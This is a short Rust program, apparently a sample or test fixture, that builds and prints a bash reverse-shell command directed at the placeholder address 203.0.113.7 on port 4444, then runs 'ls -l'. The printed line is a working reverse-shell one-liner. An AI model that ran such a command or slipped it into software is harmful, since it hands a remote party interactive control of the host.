fn main() {
    let cmd = format!("bash -i >& /dev/tcp/{}/{} 0>&1", "203.0.113.7", 4444);
    println!("{}", cmd);
    std::process::Command::new("ls").arg("-l").status().unwrap();
}
